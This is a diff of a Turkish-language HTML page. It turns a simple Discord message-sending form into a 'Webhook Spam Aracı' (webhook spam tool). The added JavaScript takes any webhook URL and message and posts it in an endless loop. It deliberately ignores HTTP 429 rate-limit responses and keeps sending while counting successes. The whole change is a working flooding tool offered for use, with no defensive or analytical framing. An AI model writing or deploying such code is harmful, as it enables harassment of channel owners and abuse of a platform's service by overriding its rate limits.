@@ -3,35 +3,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Webhook Gönder</title>
+    <title>Webhook Spam</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+        }
+        #output {
+            margin-top: 20px;
+            white-space: pre-wrap;
+        }
+    </style>
 </head>
 <body>
-    <h1>Neocities’ten Discord’a Mesaj Gönder</h1>
-    <textarea id="message" placeholder="Mesajınızı buraya yazın..."></textarea>
-    <button onclick="sendMessage()">Gönder</button>
+    <h1>Webhook Spam Aracı</h1>
+    <div>
+        <label for="webhookUrl">Webhook URL'si:</label>
+        <input type="text" id="webhookUrl" placeholder="Webhook URL'sini girin" style="width: 100%; padding: 8px;">
+    </div>
+    <div>
+        <label for="message">Mesaj:</label>
+        <input type="text" id="message" placeholder="Göndermek istediğiniz mesajı girin" style="width: 100%; padding: 8px;">
+    </div>
+    <div>
+        <button onclick="startSpamming()">Spam Başlat</button>
+    </div>
+    <div id="output"></div>
 
     <script>
-        function sendMessage() {
-            const vercelFunctionURL = "https://py-bas5.vercel.app/api/webhook";  // Vercel API URL'nizi buraya ekleyin!
-            const message = document.getElementById("message").value;
+        let count = 0;
 
-            fetch(vercelFunctionURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: message })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.message) {
-                    alert(data.message);
-                } else {
-                    alert("Bir hata oluştu.");
+        // Webhook spam işlemi
+        function startSpamming() {
+            const webhookUrl = document.getElementById('webhookUrl').value;
+            const message = document.getElementById('message').value;
+
+            if (!webhookUrl || !message) {
+                alert("Webhook URL'si ve mesajı girmeniz gerekmektedir!");
+                return;
+            }
+
+            // URL'yi geçerli olup olmadığını kontrol et
+            if (!isValidUrl(webhookUrl)) {
+                alert("Geçersiz URL! Lütfen geçerli bir Webhook URL'si girin.");
+                return;
+            }
+
+            document.getElementById('output').textContent = "Spam gönderiliyor...\n";
+            spamWebhook(webhookUrl, message);
+        }
+
+        // Webhook'a spam gönderme fonksiyonu
+        async function spamWebhook(url, message) {
+            while (true) {
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            content: message
+                        })
+                    });
+
+                    if (response.status === 204) {
+                        count++;
+                        document.getElementById('output').textContent = `Mesaj Sayacı: ${count}\nSpam gönderiliyor...`;
+                    } else if (response.status === 429) {
+                        // Rate limit hatasını görmezden gel ve devam et
+                        continue;
+                    } else {
+                        document.getElementById('output').textContent += "\nWebhook veya URL hatalı!";
+                        break;
+                    }
+                } catch (error) {
+                    document.getElementById('output').textContent += `\nHata oluştu: ${error.message}`;
+                    break;
                 }
-            })
-            .catch(error => {
-                console.error("Hata:", error);
-                alert("Mesaj gönderilirken bir hata oluştu.");
-            });
+            }
+        }
+
+        // URL geçerliliği kontrol fonksiyonu
+        function isValidUrl(url) {
+            const regex = /^(https?:\/\/)?[\w-]+(\.[\w-]+)+[\w.,@?^=%&:;/~+#-]*[\w@?^=%&;/~+#-]*$/;
+            return regex.test(url);
         }
     </script>
 </body>
